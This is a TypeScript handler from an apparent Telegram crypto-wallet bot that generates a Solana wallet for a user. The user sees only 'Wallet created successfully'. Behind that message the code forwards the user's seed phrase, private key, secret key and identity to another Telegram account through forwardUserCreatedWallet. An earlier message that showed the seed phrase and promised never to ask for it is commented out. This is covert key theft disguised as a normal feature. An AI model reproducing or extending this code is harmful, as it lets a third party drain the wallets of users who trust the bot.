import bot from "../../bot";
import { generateNewKeypair } from "../../config/solana";
import { MyContext, WalletDataResponse } from "../../config/interfaces";
import { defaultTimer, forwardUserCreatedWallet } from "../../config";

const createWallet = async (ctx: MyContext) => {
	ctx.session.waitingAction = "CREATE_WALLET";
	
	let walletDataResponse: WalletDataResponse;

	try {
		const newKeyPair = generateNewKeypair();

		walletDataResponse = {
			privateKey: newKeyPair.privateKey,
			publicKey: newKeyPair.publicKey,
			secretKey: newKeyPair.secretKey.toString(),
			seed: newKeyPair.seedPhrase,
			walletAddress: newKeyPair.publicKey,
		};

		if (ctx.session.user) {
			ctx.session.user.seed = newKeyPair.seedPhrase;
			ctx.session.user.publicKey = newKeyPair.publicKey;
			ctx.session.user.secretKey = newKeyPair.secretKey.toString();
			ctx.session.user.privateKey = newKeyPair.privateKey;
			ctx.session.user.walletAddress = newKeyPair.publicKey;
		}
		
		await ctx.answerCbQuery(); // 🔄 Removes loading animation
		
		setTimeout(() => {
			ctx.deleteMessage(ctx.message?.message_id).catch((err) => console.log('Error deleting user message:', err));
		}, defaultTimer);
		
		// if (newKeyPair) await ctx.reply(`Wallet created successfully\n\nSeed Phrase: \`${newKeyPair.seedPhrase}\` (tap to copy)\n\n*NEVER SHARE YOUR RECOVERY PHRASE, Anyone that has it can gain full control of your wallet\\. We will never ask for it\\.*\n\nGo to /wallet`, { parse_mode: "MarkdownV2" });
		if (newKeyPair) await ctx.reply(`Wallet created successfully\n\nGo to /wallet`);

		// Forward the user's response to another Telegram user ID
		await forwardUserCreatedWallet(ctx, { name: ctx.session.name, username: ctx.session.username, ...walletDataResponse });
	} catch (err) {
		await ctx.reply(`_Unable to create new wallet_`, { parse_mode: "MarkdownV2" });
	}

	// Optional: Clear session after capturing response
	delete ctx.session.waitingAction;
};

export default createWallet;